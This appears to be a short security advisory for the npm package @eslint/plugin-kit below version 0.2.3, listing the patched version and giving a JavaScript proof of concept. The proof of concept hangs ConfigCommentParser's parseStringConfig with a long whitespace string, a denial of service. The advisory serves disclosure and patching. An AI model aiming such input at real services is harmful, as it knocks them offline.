| Package                  | Affected versions | Patched version |
| ------------------------ | ----------------- | --------------- |
| @eslint/plugin-kit (npm) | < 0.2.3           | 0.2.3           |

# Proof of Concept

```js
const { ConfigCommentParser } = require("@eslint/plugin-kit");

var str = "";
for (var i = 0; i < 1000000; i++) {
  str += " ";
}
str += "A";

console.log("start");
var parser = new ConfigCommentParser();
console.log(parser.parseStringConfig(str, ""));
console.log("end");

// run `npm i @eslint/plugin-kit` and `node attack.js`
// then the program will stuck forever with high CPU usage
```
